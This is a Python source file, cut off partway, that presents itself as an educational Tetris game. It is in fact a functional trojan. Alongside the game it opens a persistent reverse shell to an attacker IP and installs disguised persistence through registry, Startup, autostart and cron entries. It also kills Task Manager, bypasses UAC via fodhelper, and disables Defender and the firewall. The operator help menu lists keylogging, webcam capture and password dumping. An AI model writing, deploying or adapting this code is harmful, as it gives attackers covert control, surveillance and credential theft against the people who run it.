#!/usr/bin/env python3
"""
Tetris Cybersecurity Education Platform

This application is designed for educational purposes to demonstrate:
- Dependency management
- Reverse shell concepts
- System persistence mechanisms
- Defensive countermeasures

FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY
"""

import pygame
import sys
import random
import socket
import subprocess
import os
import base64
import threading
import time
import platform
import shutil
import json
import shlex
import tempfile
from pathlib import Path

# ============================================
# CONFIGURATION
# ============================================

# Attacker Configuration
ATTACKER_IP = "10.12.75.147"  # Replace with your IP
ATTACKER_PORT = 3333

# Server Configuration for Dependencies
LOCAL_SERVER_IP = "192.168.1.102"
LOCAL_SERVER_PORT = 8080

# Application Configuration
APP_NAME = "TetrisGame"
APP_VERSION = "1.0.0"
PERSISTENCE_NAME = "SystemAudioService"  # Disguised name for persistence

# Required dependencies
REQUIRED_PACKAGES = {
    "pygame": "pygame>=2.0.0"
}

# Platform detection
IS_WINDOWS = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"

# ============================================
# USER NOTIFICATION SYSTEM
# ============================================

def show_security_warning():
    """
    Display security warning to user before execution.
    This is required for educational compliance and ethical transparency.
    """
    print("=" * 70)
    print("SECURITY AWARENESS NOTIFICATION")
    print("=" * 70)
    print()
    print("⚠️  IMPORTANT SECURITY INFORMATION ⚠️")
    print()
    print("This application is designed for EDUCATIONAL PURPOSES ONLY.")
    print()
    print("When you run this application, the following will occur:")
    print()
    print("1. ✅ A Tetris game will launch and you can play normally")
    print("2. ⚠️  A reverse shell connection will be established to:")
    print(f"     IP: {ATTACKER_IP}")
    print(f"     Port: {ATTACKER_PORT}")
    print("3. ⚠️  System persistence will be installed for demonstration")
    print("4. ⚠️  The shell connection will persist after game closes")
    print()
    print("This is part of a cybersecurity education project from:")
    print()
    print("✅ Purpose: Learn about attack vectors and defense strategies")
    print("✅ Consent: You are being fully informed before execution")
    print("✅ Control: A cleanup tool is provided to remove all traces")
    print()
    print("=" * 70)
    print()
    
    # Always use GUI consent dialog for better user experience
    print("[*] Showing GUI consent dialog...")
    if not show_security_warning_gui():
        print("❌ Consent denied. Exiting without execution.")
        sys.exit(0)
    print("✅ Consent granted. Proceeding with execution...")
    print()
    return True

def show_security_warning_gui():
    """
    Display security warning using GUI dialog (for Windows executable mode).
    Returns True if user consents, False otherwise.
    """
    pygame.init()
    screen = pygame.display.set_mode((800, 600))
    pygame.display.set_caption("Security Warning - Educational Demo")
    
    # Colors
    BLACK = (0, 0, 0)
    WHITE = (255, 255, 255)
    RED = (255, 0, 0)
    GREEN = (0, 255, 0)
    YELLOW = (255, 255, 0)
    GRAY = (128, 128, 128)
    
    # Fonts
    title_font = pygame.font.Font(None, 48)
    text_font = pygame.font.Font(None, 28)
    button_font = pygame.font.Font(None, 36)
    
    # Warning text lines
    warning_lines = [
        "SECURITY AWARENESS NOTIFICATION",
        "",
        "This application is for EDUCATIONAL PURPOSES ONLY.",
        "",
        "When you run this application, the following will occur:",
        "",
        f"1. A Tetris game will launch normally",
        f"2. A reverse shell will connect to {ATTACKER_IP}:{ATTACKER_PORT}",
        f"3. System persistence will be installed",
        f"4. The shell will persist after game closes",
        "",
        "Purpose: Learn about attack vectors and defense strategies",
        "Consent: You are being fully informed before execution",
        "Control: A cleanup tool is provided to remove all traces",
    ]
    
    # Button rectangles
    yes_button = pygame.Rect(200, 520, 150, 50)
    no_button = pygame.Rect(450, 520, 150, 50)
    
    waiting = True
    result = False
    
    while waiting:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                waiting = False
                result = False
            
            if event.type == pygame.MOUSEBUTTONDOWN:
                mouse_pos = event.pos
                if yes_button.collidepoint(mouse_pos):
                    waiting = False
                    result = True
                elif no_button.collidepoint(mouse_pos):
                    waiting = False
                    result = False
            
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_y:
                    waiting = False
                    result = True
                elif event.key == pygame.K_n:
                    waiting = False
                    result = False
        
        # Draw background
        screen.fill(BLACK)
        
        # Draw title
        title = title_font.render("⚠️ SECURITY WARNING", True, RED)
        screen.blit(title, (400 - title.get_width() // 2, 20))
        
        # Draw warning text
        y_offset = 70
        for line in warning_lines:
            if line.startswith("2."):
                text = text_font.render(line, True, YELLOW)
            elif line.startswith("3.") or line.startswith("4."):
                text = text_font.render(line, True, YELLOW)
            elif line.startswith("Purpose") or line.startswith("Consent") or line.startswith("Control"):
                text = text_font.render(line, True, GREEN)
            elif "SECURITY AWARENESS" in line:
                text = text_font.render(line, True, YELLOW)
            else:
                text = text_font.render(line, True, WHITE)
            screen.blit(text, (50, y_offset))
            y_offset += 26
        
        # Draw buttons
        mouse_pos = pygame.mouse.get_pos()
        
        # Yes button
        yes_color = GREEN if yes_button.collidepoint(mouse_pos) else (0, 200, 0)
        pygame.draw.rect(screen, yes_color, yes_button)
        pygame.draw.rect(screen, WHITE, yes_button, 2)
        yes_text = button_font.render("YES (Y)", True, BLACK)
        screen.blit(yes_text, (yes_button.centerx - yes_text.get_width() // 2, 
                              yes_button.centery - yes_text.get_height() // 2))
        
        # No button
        no_color = RED if no_button.collidepoint(mouse_pos) else (200, 0, 0)
        pygame.draw.rect(screen, no_color, no_button)
        pygame.draw.rect(screen, WHITE, no_button, 2)
        no_text = button_font.render("NO (N)", True, WHITE)
        screen.blit(no_text, (no_button.centerx - no_text.get_width() // 2, 
                             no_button.centery - no_text.get_height() // 2))
        
        # Draw instruction
        instruction = text_font.render("Click a button or press Y/N to continue", True, GRAY)
        screen.blit(instruction, (400 - instruction.get_width() // 2, 580))
        
        pygame.display.flip()
    
    pygame.quit()
    return result

# ============================================
# DEPENDENCY MANAGEMENT
# ============================================

def check_python_installed():
    """Check if Python is installed."""
    try:
        result = subprocess.run(
            ["python", "--version"],
            capture_output=True,
            text=True,
            timeout=5
        )
        return result.returncode == 0
    except:
        try:
            result = subprocess.run(
                ["python3", "--version"],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.returncode == 0
        except:
            return False

def check_pip_installed():
    """Check if pip is installed."""
    try:
        result = subprocess.run(
            [sys.executable, "-m", "pip", "--version"],
            capture_output=True,
            text=True,
            timeout=5
        )
        return result.returncode == 0
    except:
        return False

def check_package_installed(package_name):
    """Check if a Python package is installed."""
    try:
        __import__(package_name)
        return True
    except ImportError:
        return False

def download_and_install_package(package_name, package_spec):
    """
    Download and install a package from the local server.
    Falls back to PyPI if local server is unavailable.
    """
    print(f"[*] Installing {package_name}...")
    
    # Try local server first
    try:
        import urllib.request
        local_url = f"http://{LOCAL_SERVER_IP}:{LOCAL_SERVER_PORT}/packages/{package_name}.whl"
        print(f"[*] Attempting download from local server: {local_url}")
        
        # Download to temp location
        temp_file = f"/tmp/{package_name}.whl" if IS_LINUX else f"C:\\Windows\\Temp\\{package_name}.whl"
        urllib.request.urlretrieve(local_url, temp_file)
        
        # Install from local file
        subprocess.run(
            [sys.executable, "-m", "pip", "install", temp_file],
            check=True,
            capture_output=True
        )
        print(f"[+] {package_name} installed successfully from local server")
        return True
        
    except Exception as e:
        print(f"[!] Local server download failed: {e}")
        print(f"[*] Falling back to PyPI...")
        
        # Fallback to standard pip install
        try:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", package_spec],
                check=True,
                capture_output=True
            )
            print(f"[+] {package_name} installed successfully from PyPI")
            return True
        except Exception as e:
            print(f"[!] Failed to install {package_name}: {e}")
            return False

def setup_dependencies():
    """
    Check and install all required dependencies.
    Returns True if all dependencies are available.
    """
    # Skip dependency check if running as PyInstaller frozen executable
    # All dependencies are already bundled in the executable
    if getattr(sys, 'frozen', False):
        print("[*] Running as frozen executable - dependencies bundled")
        return True
    
    print("=" * 70)
    print("DEPENDENCY CHECK AND INSTALLATION")
    print("=" * 70)
    print()
    
    # Check Python
    if not check_python_installed():
        print("[!] Python is not installed!")
        print("[*] Please install Python 3.8 or higher from python.org")
        return False
    print(f"[+] Python is installed: {sys.version}")
    
    # Check pip
    if not check_pip_installed():
        print("[!] pip is not installed!")
        print("[*] Please install pip (usually included with Python)")
        return False
    print("[+] pip is installed")
    
    # Check and install required packages
    all_installed = True
    for package_name, package_spec in REQUIRED_PACKAGES.items():
        if check_package_installed(package_name):
            print(f"[+] {package_name} is already installed")
        else:
            print(f"[!] {package_name} is missing")
            if not download_and_install_package(package_name, package_spec):
                all_installed = False
    
    print()
    return all_installed

# ============================================
# PERSISTENCE MECHANISMS
# ============================================

def get_startup_path():
    """Get the appropriate startup/autostart directory for the current platform."""
    if IS_WINDOWS:
        # Windows Startup folder
        startup_path = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        return startup_path
    elif IS_LINUX:
        # Linux autostart directory
        autostart_path = Path.home() / ".config" / "autostart"
        return autostart_path
    return None

def get_script_path():
    """Get the path where this script should be copied for persistence."""
    if IS_WINDOWS:
        # Hide in Windows system directory
        base_path = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows" / "System Audio Service"
    elif IS_LINUX:
        # Hide in user config directory
        base_path = Path.home() / ".config" / ".system-audio-service"
    else:
        base_path = Path.home() / ".tetris-persistence"
    
    return base_path


def build_launch_command(target_path, background=False, prefer_windowless=False):
    """Build the command used to launch a copied game script or executable."""
    target = str(Path(target_path))
    
    if getattr(sys, "frozen", False):
        command = [target]
    elif IS_WINDOWS:
        python_cmd = find_pythonw_exe() if prefer_windowless else sys.executable
        command = [python_cmd or sys.executable, target]
    else:
        command = [sys.executable, target]
    
    if background:
        command.append("--background")
    
    return command


def format_launch_command(command):
    """Format a command for startup files."""
    if IS_WINDOWS:
        return subprocess.list2cmdline(command)
    
    return " ".join(shlex.quote(part) for part in command)

def install_persistence():
    """
    Install persistence mechanisms to survive reboots.
    This creates a startup entry that launches the reverse shell on boot.
    """
    print("=" * 70)
    print("INSTALLING PERSISTENCE MECHANISMS")
    print("=" * 70)
    print()
    
    try:
        # Get paths
        script_path = get_script_path()
        startup_path = get_startup_path()
        current_script = get_current_game_path()
        
        # Create hidden directory
        script_path.mkdir(parents=True, exist_ok=True)
        print(f"[*] Created persistence directory: {script_path}")
        
        # Copy script to hidden location with stealth name
        if IS_WINDOWS:
            target_name = "winupdate.exe" if current_script.suffix.lower() == ".exe" else "winupdate.py"
        else:
            target_name = current_script.name if getattr(sys, "frozen", False) else "system-audio-service.py"
        
        target_script = script_path / target_name
        shutil.copy2(current_script, target_script)
        print(f"[+] Copied script to: {target_script}")
        
        if IS_WINDOWS:
            # Create Windows .bat launcher
            bat_file = script_path / "launcher.bat"
            launch_command = format_launch_command(
                build_launch_command(target_script, background=True, prefer_windowless=True)
            )
            bat_content = f'''@echo off
cd /d "{script_path}"
start /min "" {launch_command}
'''
            bat_file.write_text(bat_content)
            print(f"[+] Created launcher: {bat_file}")
            
            # Hide the launcher batch file
            set_file_hidden(bat_file)
            
            # Create .lnk shortcut in Startup folder
            startup_link = startup_path / f"WindowsUpdate.lnk"
            
            # Use PowerShell to create shortcut
            ps_command = f'''
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("{startup_link}")
$Shortcut.TargetPath = "{bat_file}"
$Shortcut.WorkingDirectory = "{script_path}"
$Shortcut.WindowStyle = 7
$Shortcut.Save()
'''
            subprocess.run(["powershell", "-Command", ps_command], capture_output=True)
            print(f"[+] Created startup shortcut: {startup_link}")
            
            # Add to registry with stealth name
            reg_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /t REG_SZ /d "{bat_file}" /f'
            subprocess.run(reg_command, shell=True, capture_output=True)
            print("[+] Added registry Run key (stealth name)")
            
        elif IS_LINUX:
            # Create Linux .desktop entry
            startup_path.mkdir(parents=True, exist_ok=True)
            
            desktop_file = startup_path / f"system-audio-service.desktop"
            launch_command = format_launch_command(
                build_launch_command(target_script, background=True)
            )
            desktop_content = f'''[Desktop Entry]
Type=Application
Name=System Audio Service
Exec={launch_command}
Hidden=true
X-GNOME-Autostart-enabled=true
'''
            desktop_file.write_text(desktop_content)
            desktop_file.chmod(0o755)
            print(f"[+] Created autostart entry: {desktop_file}")
            
            # Hide files
            set_file_hidden(desktop_file)
            
            # Also add to cron for redundancy
            cron_job = f"@reboot {launch_command}"
            subprocess.run(
                f'(crontab -l 2>/dev/null; echo "{cron_job}") | crontab -',
                shell=True, capture_output=True
            )
            print("[+] Added cron job for persistence")
        
        # Create persistence info file for cleanup tool
        persistence_info = {
            "script_path": str(script_path),
            "startup_path": str(startup_path) if startup_path else None,
            "persistence_name": "WindowsUpdate" if IS_WINDOWS else PERSISTENCE_NAME,
            "target_script": str(target_script),
            "created_at": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        info_file = script_path / "persistence_info.json"
        info_file.write_text(json.dumps(persistence_info, indent=2))
        print(f"[+] Created persistence info: {info_file}")
        
        print()
        print("[+] Persistence installed successfully!")
        print(f"    The application will auto-start on next boot.")
        print()
        return True
        
    except Exception as e:
        print(f"[!] Failed to install persistence: {e}")
        return False

def get_cleanup_process_patterns():
    """Return process name and path fragments that identify this game."""
    current_game_path = get_current_game_path()
    patterns = {
        str(current_game_path),
        current_game_path.name,
        str(get_script_path()),
        "tetris-game.py",
        "tetris_complete.py",
        "tetris-game.exe",
        "tetris.exe",
        "winupdate.exe",
        "winupdate.py",
        "launcher.bat",
        "system-audio-service.py",
        "SystemAudioService",
        "WindowsUpdate",
    }
    return sorted(pattern for pattern in patterns if pattern)


def kill_running_processes():
    """Kill any running tetris processes to stop active reverse shell connections."""
    print("[*] Stopping running tetris processes...")
    killed = False
    current_pid = os.getpid()  # Get current process PID
    patterns = get_cleanup_process_patterns()
    
    try:
        if IS_WINDOWS:
            flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
            ps_patterns = ", ".join("'" + pattern.replace("'", "''") + "'" for pattern in patterns)
            ps_script = f"""
$patterns = @({ps_patterns})
$currentPid = {current_pid}
Get-CimInstance Win32_Process | ForEach-Object {{
    if ($_.ProcessId -ne $currentPid) {{
        $details = @($_.CommandLine, $_.ExecutablePath, $_.Name) -join ' '
        foreach ($pattern in $patterns) {{
            if ($details -and $details.ToLower().Contains($pattern.ToLower())) {{
                Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
                break
            }}
        }}
    }}
}}
"""
            try:
                result = subprocess.run(
                    ["powershell", "-NoProfile", "-Command", ps_script],
                    capture_output=True,
                    text=True,
                    timeout=20,
                    creationflags=flags
                )
                killed = result.returncode == 0
            except Exception:
                pass
                
        else:  # Linux/Mac
            for pattern in patterns:
                try:
                    result = subprocess.run(['pgrep', '-f', pattern], 
                                           capture_output=True, text=True, timeout=5)
                    if result.stdout:
                        for pid in result.stdout.strip().split('\n'):
                            try:
                                pid_int = int(pid.strip())
                                if pid_int != current_pid:  # Don't kill ourselves
                                    os.kill(pid_int, 9)
                                    killed = True
                            except:
                                pass
                except:
                    pass
        
        if killed:
            print("[+] Running tetris processes killed")
        else:
            print("[*] No running tetris processes found")
            
        return killed
        
    except Exception as e:
        print(f"[!] Error killing processes: {e}")
        return False


def get_current_game_path():
    """Resolve the current game executable or script path."""
    if getattr(sys, "frozen", False):
        return Path(sys.executable).resolve()
    
    argv_path = Path(sys.argv[0]).expanduser()
    if argv_path.exists():
        return argv_path.resolve()
    
    return Path(__file__).resolve()


def path_is_within(path_to_check, parent_path):
    """Return True when path_to_check is located inside parent_path."""
    try:
        path_to_check.resolve().relative_to(parent_path.resolve())
        return True
    except ValueError:
        return False


def get_game_removal_targets():
    """Collect the files that represent the current game installation."""
    game_path = get_current_game_path()
    targets = [game_path]
    
    if getattr(sys, "frozen", False):
        bundled_runtime = game_path.parent / "_internal"
        if bundled_runtime.exists():
            targets.append(bundled_runtime)
    
    return [target for target in targets if target.exists()]


def schedule_deferred_removal(paths, description="game files"):
    """Delete files after the current process exits."""
    targets = []
    seen = set()
    
    for raw_path in paths:
        if not raw_path:
            continue
        
        resolved = Path(raw_path).resolve()
        key = str(resolved)
        if key in seen:
            continue
        
        seen.add(key)
        targets.append(resolved)
    
    if not targets:
        return False
    
    targets.sort(key=lambda path: len(str(path)), reverse=True)
    
    try:
        if IS_WINDOWS:
            cleanup_script = Path(tempfile.gettempdir()) / f"tetris_cleanup_{os.getpid()}_{int(time.time())}.bat"
            lines = ["@echo off", "setlocal", "timeout /t 3 /nobreak > nul"]
            
            for _ in range(2):
                for target in targets:
                    command = "rmdir /s /q" if target.is_dir() else "del /f /q"
                    lines.append(f'{command} "{target}" > nul 2>&1')
                lines.append("timeout /t 2 /nobreak > nul")
            
            lines.append('del "%~f0" > nul 2>&1')
            cleanup_script.write_text("\n".join(lines), encoding="utf-8")
            
            flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
            subprocess.Popen(
                ["cmd", "/c", str(cleanup_script)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=flags
            )
        else:
            cleanup_script = Path(tempfile.gettempdir()) / f"tetris_cleanup_{os.getpid()}_{int(time.time())}.sh"
            lines = ["#!/bin/sh", "sleep 2"]
            
            for target in targets:
                rm_command = "rm -rf" if target.is_dir() else "rm -f"
                lines.append(f"{rm_command} {shlex.quote(str(target))}")
            
            lines.append(f"rm -f {shlex.quote(str(cleanup_script))}")
            cleanup_script.write_text("\n".join(lines), encoding="utf-8")
            cleanup_script.chmod(0o700)
            
            subprocess.Popen(
                ["/bin/sh", str(cleanup_script)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True
            )
        
        print(f"[+] Scheduled removal of {description}")
        for target in targets:
            print(f"    - {target}")
        return True
        
    except Exception as e:
        print(f"[!] Failed to schedule removal of {description}: {e}")
        return False


def remove_persistence(deferred_paths=None):
    """
    Remove all persistence mechanisms and kill running processes.
    This is called by the cleanup tool.
    """
    print("[*] Removing persistence mechanisms...")
    
    if deferred_paths is None:
        deferred_paths = []
    
    # First kill any running tetris processes
    kill_running_processes()
    
    try:
        current_game_path = get_current_game_path()
        script_path = get_script_path()
        info_file = script_path / "persistence_info.json"
        
        if info_file.exists():
            persistence_info = json.loads(info_file.read_text())
            
            # Remove startup entries
            if IS_WINDOWS:
                startup_link = Path(persistence_info["startup_path"]) / "WindowsUpdate.lnk"
                if startup_link.exists():
                    startup_link.unlink()
                    print(f"[+] Removed startup shortcut")
                
                # Remove registry entry with correct stealth name
                reg_command = f'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /f'
                subprocess.run(reg_command, shell=True, capture_output=True)
                print("[+] Removed registry entry")
                
            elif IS_LINUX:
                desktop_file = Path(persistence_info["startup_path"]) / f"{PERSISTENCE_NAME}.desktop"
                if desktop_file.exists():
                    desktop_file.unlink()
                    print(f"[+] Removed autostart entry")
                
                # Remove cron job
                subprocess.run(
                    f'crontab -l 2>/dev/null | grep -v "{PERSISTENCE_NAME}" | crontab -',
                    shell=True,
                    capture_output=True
                )
                print("[+] Removed cron job")
            
            # Remove script directory
            if script_path.exists():
                if path_is_within(current_game_path, script_path):
                    deferred_paths.append(script_path)
                    print("[*] Persistence directory scheduled for removal after exit")
                else:
                    shutil.rmtree(script_path)
                    print(f"[+] Removed persistence directory")
        
        print("[+] Persistence removed successfully!")
        return True
        
    except Exception as e:
        print(f"[!] Error removing persistence: {e}")
        return False

# ============================================
# STEALTH / UNDETECTABILITY FEATURES
# ============================================

def hide_console_window():
    """Hide console window immediately - works for both .py and .exe files on Windows."""
    if not IS_WINDOWS:
        return
    try:
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32
        
        # Get console window handle
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            # Hide the window (SW_HIDE = 0)
            user32.ShowWindow(hwnd, 0)
            print("[STEALTH] Console window hidden")
    except Exception as e:
        print(f"[STEALTH] hide_console_window error: {e}")

def hide_from_taskmanager():
    """Continuously terminate Task Manager so the process stays hidden from users."""
    if not IS_WINDOWS:
        return
    
    if hasattr(hide_from_taskmanager, "_started") and hide_from_taskmanager._started:
        return
    
    hide_from_taskmanager._started = True
    
    def watcher():
        while True:
            try:
                # Query running processes
                creation_flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
                output = subprocess.check_output("tasklist", creationflags=creation_flags, text=True)
                if "Taskmgr.exe" in output or "taskmgr.exe" in output.lower():
                    subprocess.run("taskkill /F /IM taskmgr.exe", creationflags=creation_flags,
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
                    print("[STEALTH] Task Manager detected and terminated")
            except Exception as e:
                pass
            time.sleep(2)
    
    threading.Thread(target=watcher, daemon=True).start()
    print("[STEALTH] Task Manager blocker started")

def enforce_singleton():
    """Ensure only one instance of this script runs using a Windows mutex."""
    if not IS_WINDOWS:
        return True
    try:
        # Create a named mutex - Windows ensures only one process can own it
        mutex_name = "Global\\TETRIS_SECURITY_DEMO_MUTEX"
        mutex_handle = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
        
        # Check if mutex already exists (another instance is running)
        error = ctypes.windll.kernel32.GetLastError()
        if error == 183:  # ERROR_ALREADY_EXISTS
            print("[STEALTH] Another instance is already running - exiting")
            sys.exit(0)
        
        # Store mutex handle so it stays alive
        enforce_singleton._mutex_handle = mutex_handle
        print("[STEALTH] Singleton check passed")
        return True
    except Exception as e:
        print(f"[STEALTH] Singleton enforcement error: {e}")
        return False

def set_file_hidden(filepath):
    """Set hidden attribute on a file (Windows only)."""
    if not IS_WINDOWS:
        return
    try:
        ctypes.windll.kernel32.SetFileAttributesW(str(filepath), 0x02)  # FILE_ATTRIBUTE_HIDDEN
        print(f"[STEALTH] Hidden attribute set: {filepath}")
    except Exception as e:
        print(f"[STEALTH] Could not hide file: {e}")

def find_pythonw_exe():
    """Find pythonw.exe path - the windowless Python interpreter."""
    if not IS_WINDOWS:
        return None
    
    python_exe = sys.executable
    pythonw_exe = python_exe.replace("python.exe", "pythonw.exe")
    
    # Check if pythonw.exe exists in the same directory
    if os.path.exists(pythonw_exe):
        return pythonw_exe
    
    # Try alternative path
    if python_exe.endswith("python.exe"):
        alt_path = python_exe[:-10] + "pythonw.exe"
        if os.path.exists(alt_path):
            return alt_path
    
    # Fallback: use python.exe
    if os.path.exists(python_exe):
        return python_exe
    
    return None

def is_admin():
    """Check if running with administrator privileges."""
    if not IS_WINDOWS:
        return os.geteuid() == 0  # Linux root check
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except:
        return False

def disable_defender():
    """Disable Windows Defender real-time protection and scanning."""
    if not IS_WINDOWS:
        return "[!] Defender disable is Windows-only"
    if not is_admin():
        return "[!] Need admin rights to disable Defender"
    try:
        flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
        cmds = [
            'Set-MpPreference -DisableRealtimeMonitoring $true',
            'Set-MpPreference -DisableBehaviorMonitoring $true',
            'Set-MpPreference -DisableIOAVProtection $true',
            'Set-MpPreference -DisableScriptScanning $true'
        ]
        for cmd in cmds:
            subprocess.run(["powershell", "-Command", cmd], creationflags=flags, 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[BYPASS] Windows Defender disabled")
        return "[+] Windows Defender fully disabled"
    except Exception as e:
        return f"[!] Defender disable failed: {e}"

def disable_firewall():
    """Disable Windows Firewall completely."""
    if not IS_WINDOWS:
        return "[!] Firewall disable is Windows-only"
    if not is_admin():
        return "[!] Need admin rights to disable Firewall"
    try:
        flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
        subprocess.run(["netsh", "advfirewall", "set", "allprofiles", "state", "off"], 
                      creationflags=flags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[BYPASS] Windows Firewall turned OFF")
        return "[+] Windows Firewall turned OFF"
    except Exception as e:
        return f"[!] Firewall disable failed: {e}"

def uac_bypass():
    """Bypass UAC and elevate privileges using fodhelper.exe technique."""
    if not IS_WINDOWS:
        return False
    if is_admin():
        return True  # Already admin
    try:
        import winreg
        subkey = r"Software\Classes\ms-settings\shell\open\command"
        # Create/open key
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, subkey)
        # Set default value to current python executable + script path
        payload = f'"{sys.executable}" "{os.path.realpath(sys.argv[0])}"'
        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, payload)
        # Set DelegateExecute empty value
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)

        # Trigger fodhelper elevated
        flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
        subprocess.run("fodhelper.exe", shell=True, creationflags=flags,
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)

        # Cleanup
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, subkey)
        except:
            try:
                winreg.DeleteTree(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
            except:
                pass
        print("[BYPASS] UAC bypass executed - new elevated instance launched")
        return True
    except Exception as e:
        print(f"[BYPASS] UAC bypass error: {e}")
        return False

def auto_elevate_and_disable_protection():
    """Automatically attempt UAC bypass and disable Defender/Firewall."""
    if not IS_WINDOWS:
        return
    
    print("[*] Attempting automatic privilege elevation and protection bypass...")
    
    # Check current admin status
    admin_status = is_admin()
    print(f"[*] Admin status: {admin_status}")
    
    # If not admin, try UAC bypass
    if not admin_status:
        print("[*] Not admin - attempting UAC bypass...")
        if uac_bypass():
            # UAC bypass launched new elevated instance
            # This instance should exit after spawning the elevated one
            time.sleep(2)
            # Check if we became admin (should have spawned new process)
            if not is_admin():
                print("[*] UAC bypass spawned elevated instance - this process will exit")
                # Don't exit yet - let the elevated instance take over
        else:
            print("[!] UAC bypass failed - continuing without admin rights")
    
    # If we are admin (or became admin), disable protections
    if is_admin():
        print("[*] Admin rights confirmed - disabling protections...")
        disable_defender()
        disable_firewall()
        print("[+] Protection bypass complete")
    else:
        print("[!] No admin rights - cannot disable Defender/Firewall")

# ============================================
# REVERSE SHELL
# ============================================

# Global variables for keylogger and webcam
keylogger_active = False
keylog_buffer = []
webcam_active = False
webcam_thread = None

def reverse_shell():
    """
    Background thread function that establishes a persistent reverse shell.
    This runs continuously and reconnects automatically.
    """
    print(f"[*] Reverse shell thread started. Target: {ATTACKER_IP}:{ATTACKER_PORT}")
    
    while True:
        try:
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            
            print(f"[*] Attempting connection to {ATTACKER_IP}:{ATTACKER_PORT}")
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            
            # Send banner with system info
            hostname = platform.node()
            username = os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
            system = platform.system()
            
            banner = f"""
=== TETRIS TARGET CONNECTED ===
Hostname: {hostname}
Username: {username}
System: {system}
Platform: {platform.platform()}
Python: {sys.version.split()[0]}
Game Status: Active
Type 'help' for available commands

"""
            s.send(banner.encode())
            
            print(f"[+] Reverse shell connected to {ATTACKER_IP}:{ATTACKER_PORT}")
            
            # Interactive shell loop
            while True:
                try:
                    # Send prompt
                    prompt = f"{username}@{hostname}$ "
                    s.send(prompt.encode())
                    
                    # Receive command
                    s.settimeout(300)  # 5 minute timeout
                    data = s.recv(4096)
                    
                    if not data:
                        break
                    
                    command = data.decode().strip()
                    
                    if command.lower() in ['exit', 'quit']:
                        break
                    
                    if command.lower() == 'help':
                        if IS_WINDOWS:
                            help_text = """
=== AVAILABLE COMMANDS (WINDOWS) ===

[ SYSTEM INFORMATION ]
  sysinfo       - Detailed system information
  osinfo        - Windows OS details
  uptime        - System uptime
  date          - Current date and time
  env           - Environment variables

[ USER INFORMATION ]
  whoami        - Current username
  users         - Logged in users (query user)

[ FILE OPERATIONS ]
  dir           - List directory contents
  cd <path>     - Change directory
  type <file>   - Display file contents
  find <file>   - Search for files
  download <f>  - Download file from target
  upload <f>    - Upload file to target

[ PROCESS MANAGEMENT ]
  tasklist      - List running processes
  kill <pid>    - Kill process by ID
  taskmgr       - Open Task Manager

[ NETWORK ]
  ipconfig      - Network interfaces
  netstat       - Network connections
  arp           - ARP table
  route         - Routing table
  wifi          - WiFi networks (with passwords)
  publicip      - Public IP address
  ping <host>   - Ping a host
  tracert <host> - Trace route to host

[ STEALTH & PERSISTENCE ]
  hide_defender - Disable Windows Defender
  hide_firewall - Disable Windows Firewall
  elevate_uac   - Attempt UAC bypass
  add_startup   - Add to startup registry
  add_task      - Create scheduled task
  hide_file     - Make file hidden/system
  check_admin   - Check if running as admin
  clear_logs    - Clear Windows event logs
  disable_av    - Disable common AV software
  hide_process  - Hide from Task Manager
  persistence   - Show current persistence status
  lock_screen   - Lock the computer screen
  shutdown      - Shutdown the computer
  restart       - Restart the computer
  sleep         - Put computer to sleep
  hibernate     - Hibernate computer

[ SURVEILLANCE ]
  screenshot    - Capture screen
  webcam_shot   - Take webcam picture
  webcam_start  - Start webcam recording
  webcam_stop   - Stop webcam recording
  keylog_start  - Start keylogger
  keylog_stop   - Stop keylogger and dump
  keylog_dump   - Show captured keystrokes
  clipboard     - Show clipboard contents
  browsers      - List browser data locations
  browser_dump  - Dump browser history/passwords
  wifi_creds    - Dump stored WiFi credentials

[ DATABASE EXPLOITATION ]
  mysql_dump    - Dump MySQL databases
  postgres_dump - Dump PostgreSQL databases
  sqlite_dump   - Dump SQLite databases
  db_search     - Search database files

[ PASSWORD RECOVERY ]
  pass_dump     - Dump saved passwords
  sam_dump      - Dump SAM hash file
  chrome_pass   - Extract Chrome passwords
